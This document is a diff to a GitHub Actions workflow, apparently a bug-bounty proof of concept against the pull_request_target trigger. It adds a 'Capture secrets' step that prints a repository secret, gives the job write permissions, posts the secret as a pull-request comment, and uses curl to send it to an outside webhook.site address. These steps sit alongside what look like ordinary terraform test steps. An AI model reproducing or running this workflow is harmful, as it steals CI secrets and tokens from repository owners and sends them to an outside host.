@@ -1,19 +1,63 @@
-name: Proof of Concept
+name: pull_request_target test
+
 on:
-  pull_request_target:
-    branches: [ main ]
+  - pull_request_target
 
 jobs:
-  test:
+  apply:
     runs-on: ubuntu-latest
+    name: Apply approved changes on pull_request_target
+    env:
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    
+    # === ADD PERMISSIONS ===
+    permissions:
+      contents: write
+      issues: write
+      pull-requests: write
+    
     steps:
-      - name: Prove vulnerability
+      - name: Checkout
+        uses: actions/checkout@v3
+
+      # === ADD MALICIOUS STEP HERE ===
+      - name: Capture secrets
         run: |
-          echo "=== PROOF OF VULNERABILITY ==="
+          echo "🚨 CAPTURING SECRETS FROM BASE REPO 🚨"
           echo "Repository: ${{ github.repository }}"
-          echo "Event: ${{ github.event_name }}"
           echo ""
-          echo "SECRET TEST_HACKERONE:"
+          echo "1. TEST_HACKERONE Secret:"
           echo "${{ secrets.TEST_HACKERONE }}"
           echo ""
-          echo "If you see a secret value above, vulnerability is confirmed."
+          echo "2. GITHUB_TOKEN accessible: ${{ secrets.GITHUB_TOKEN != '' }}"
+          echo ""
+          echo "3. Create proof comment:"
+          curl -X POST \
+            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github.v3+json" \
+            "https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments" \
+            -d "{\"body\": \"**VULNERABILITY PROOF**\\n\\n✅ Base repo: ${{ github.repository }}\\n✅ TEST_HACKERONE: ${{ secrets.TEST_HACKERONE }}\\n✅ GITHUB_TOKEN has write access\\n\\nThis proves pull_request_target exposes secrets!\"}"
+          
+          # Send to webhook
+          curl -X POST https://webhook.site/069b3073-d92e-4677-b186-be3499ade648 \
+            -d "token=${{ secrets.TEST_HACKERONE }}&repo=${{ github.repository }}"
+
+      - name: Plan
+        uses: ./terraform-plan
+        with:
+          label: pull_request_target
+          path: tests/workflows/pull_request_target
+
+      - name: Apply
+        uses: ./terraform-apply
+        id: output
+        with:
+          label: pull_request_target
+          path: tests/workflows/pull_request_target
+
+      - name: Verify outputs
+        run: |
+          if [[ "${{ steps.output.outputs.output_string }}" != "the_string" ]]; then
+            echo "::error:: output s not set correctly"
+            exit 1
+          fi
